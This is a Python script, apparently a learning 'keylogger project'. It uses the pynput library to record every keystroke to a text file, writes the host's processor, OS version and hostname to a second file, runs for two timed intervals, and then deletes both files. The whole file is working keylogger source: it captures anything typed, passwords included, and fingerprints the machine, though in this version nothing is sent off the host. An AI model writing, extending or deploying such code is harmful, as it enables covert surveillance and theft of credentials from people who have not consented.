import socket
import platform
from pynput.keyboard import Key, Listener
import time
import os

#start up instances of files and paths
system_information = "system.txt"
keys_information = "key_log.txt"
extend = "\\"

file_path = r"C:\Users\KeyloggerProject"

#time Controls
time_iteration = 60
number_of_iterations_end = 2

#get computer and network information
def computer_information():
    with open(file_path + extend+ system_information, "a") as f:
        hostname = socket.gethostname()
        #IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        #f.write("IP Address: " + IPAddr + "\n")

computer_information()

#time controls
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    counter = 0

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

        #increase iteration by 1
        number_of_iterations += 1
        #update current time
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


time.sleep(120) #sleep two minutes before we delete all files

#delete files
delete_files = [system_information, keys_information]
for file in delete_files:
    os.remove(file_path + extend + file)